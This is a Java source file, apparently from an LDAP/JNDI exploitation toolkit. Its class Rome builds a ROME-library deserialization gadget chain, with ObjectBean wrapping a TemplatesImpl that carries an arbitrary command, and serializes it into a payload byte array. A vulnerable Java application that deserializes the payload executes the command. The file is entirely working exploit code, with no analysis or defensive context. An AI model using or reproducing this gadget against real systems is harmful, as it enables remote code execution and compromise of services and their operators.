package com.feihong.ldap.gadgets;

import com.feihong.ldap.enumtypes.PayloadType;
import com.sun.syndication.feed.impl.ObjectBean;
import com.feihong.ldap.gadgets.utils.Gadgets;

import javax.xml.transform.Templates;
import java.io.*;
import java.util.HashMap;

public class Rome {
    public static byte[] getBytes ( String cmd ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(PayloadType.command, cmd);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        HashMap gadget_map = Gadgets.makeMap(root, root);
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(gadget_map);
        byte[] bytes = baous.toByteArray();
        oos.close();
        return bytes;
    }
}
